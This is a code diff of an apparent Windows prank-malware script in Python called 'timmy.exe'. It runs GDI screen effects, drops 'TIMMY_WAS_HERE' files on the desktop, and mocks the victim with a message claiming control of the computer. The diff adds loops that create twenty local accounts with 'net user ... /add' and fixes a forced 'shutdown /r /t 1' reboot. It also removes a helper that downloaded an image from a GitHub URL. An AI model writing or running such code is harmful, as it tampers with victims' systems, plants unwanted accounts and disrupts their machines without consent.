@@ -36,15 +36,15 @@ def begin():
             gdi3()
             gdi4()
         for i in range(100):
-            image("https://raw.githubusercontent.com/gaers-svg/timmy.exe/refs/heads/main/TLAB-278.jpg")
             gdi3()
             gdi4()
             gdi()
             gdi2()
+        for i in range(20):
             username = f"TIMMY{i}"
             subprocess.run(["net", "user", username, "TIMMY", "/add"])
 
-        os.system("restart /r /t 1")
+        os.system("shutdown /r /t 1")
         
     else:
         messagebox.showerror("timmy", "trick question: i already have control of your computer lolOLOLOlolOlolO")
@@ -58,13 +58,15 @@ def begin():
             gdi3()
             gdi4()
         for i in range(100):
-            image("https://raw.githubusercontent.com/gaers-svg/timmy.exe/refs/heads/main/TLAB-278.jpg")
             gdi3()
             gdi4()
             gdi()
             gdi2()
+        for i in range(20):
             username = f"TIMMY{i}"
             subprocess.run(["net", "user", username, "TIMMY", "/add"])
+
+        os.system("shutdown /r /t 1")
 def sound2():
     playsound(sound_url)
 
@@ -76,14 +78,6 @@ def file():
         with open(f"{desktop}\\TIMMY_WAS_HERE{i}.txt", "w") as f:
             f.write("TIMMY WAS HERE")
 
-def image(img_url):
-    downloads = os.path.join(os.path.expanduser("~"), "Downloads")
-
-    file_name = os.path.join(downloads, "downloaded_image.jpg")
-
-    urllib.request.urlretrieve(img_url, file_name)
-
-    print("Saved to:", file_name)
 
 def timmy():
     img_path, _ = urllib.request.urlretrieve(img_url)
